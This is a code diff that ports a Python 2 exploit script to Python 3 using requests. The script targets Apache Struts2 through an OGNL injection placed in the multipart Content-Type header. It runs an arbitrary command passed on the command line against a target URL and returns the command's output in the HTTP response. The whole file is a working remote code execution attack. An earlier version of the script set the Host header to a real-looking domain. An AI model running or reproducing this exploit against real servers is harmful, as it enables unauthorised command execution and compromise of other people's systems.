@@ -1,17 +1,20 @@
-import urllib
-import urllib2,sys
-from poster.encode import multipart_encode
-from poster.streaminghttp import register_openers
-cmd= sys.argv[2]
+import urllib.request
+import sys
+import requests
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+cmd = sys.argv[2]
 # cd webapps\\ROOT & dir
+
 def main():
-    register_openers()
-    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
-    header["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
-    header["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
-    header['Host']="www.okii.com"
-    header['Accept-Language']="zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"
-    header["Content-Type"]='''%{(#nike='multipart/form-data').
+    url = str(sys.argv[1])
+    m = MultipartEncoder(fields={"image1": ("tmp.txt", open("tmp.txt", "rb"), "text/plain")})
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Host": "127.0.0.1",
+        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Content-Type": '''%{(#nike='multipart/form-data').
     (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
     (#_memberAccess?(#_memberAccess=#dm):
     ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
@@ -24,9 +27,9 @@ def main():
     (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
     getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
     (#ros.flush())}'''
-    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
-    response = urllib2.urlopen(request)
-    print response.read()
+    }
+    r = requests.post(url, data=m, headers=headers)
+    print(r.text)
 
 if __name__ == '__main__':
     main()
